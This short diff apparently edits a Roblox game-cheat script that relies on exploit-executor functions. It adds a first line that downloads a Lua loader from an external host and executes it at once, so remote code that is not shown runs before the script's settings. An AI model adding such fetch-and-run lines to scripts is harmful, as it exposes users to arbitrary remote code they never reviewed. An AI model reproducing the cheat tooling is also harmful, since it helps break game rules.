@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://flowauth.net/v1/loaders/99f85ef7108e9c5793d4da5d3edbbf82.lua"))()
 task.wait(5)
 -- [ Settings ] --
 getgenv().AutoSkipCutscenes = true
